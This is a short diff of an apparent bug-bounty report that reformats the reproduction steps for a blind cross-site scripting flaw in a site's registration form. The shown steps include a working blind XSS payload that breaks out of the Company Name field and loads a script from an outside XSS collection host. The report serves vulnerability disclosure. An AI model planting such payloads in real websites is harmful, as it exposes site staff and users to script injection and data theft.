@@ -18,9 +18,10 @@ https://kzlabs.com/63.php?view=register
 ---
 ## Steps to Reproduce
 1. Register a new account in the following URL
+```
  `https://kzlabs.com/63.php?view=register`
-
-2. In the **Company Name** field enter the following blind XSS payload:
+```
+3. In the **Company Name** field enter the following blind XSS payload:
 ```
 '"><script src=https://xss.report/c/shaz10></script>
 ```
